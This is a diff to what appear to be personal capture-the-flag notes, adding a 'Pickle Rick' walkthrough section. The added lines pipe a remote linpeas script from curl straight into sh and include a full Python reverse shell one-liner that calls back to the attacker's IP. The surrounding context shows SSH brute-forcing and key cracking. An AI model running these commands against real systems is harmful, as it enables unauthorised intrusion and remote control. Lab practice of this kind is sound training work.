@@ -14,6 +14,8 @@ hydra -l {user name} -P /usr/share/wordlists/rockyou.txt ssh://{target IP}
 # Linux Privilege Escalation
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 scp ./linpeas.sh {user name}@{target IP}:/dev/shm
+# or just run on the target machine
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
 ```bash
@@ -31,4 +33,29 @@ ssh2john kay_id_rsa > forjohn.txt
 john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
 # now login the target machine with passphrase
 ssh -i kay_id_rsa {user name}@{target IP}
+```
+
+## Pickle Rick
+
+```bash
+nmap -sC -sV -oN nmap.log {target IP}
+nikto -h http://{target IP} | tee nikto.log
+gobuster dir -u http://10.10.131.195 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
+```
+
+```bash
+# if 'cat' command is denied, it may allow use.
+grep . clue.txt
+# make sure that python can use.
+python3 -c "print('hello')"
+
+# use reverse shell
+# https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my IP addr}",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+```bash
+# show authority on current dir
+sudo -l
 ```
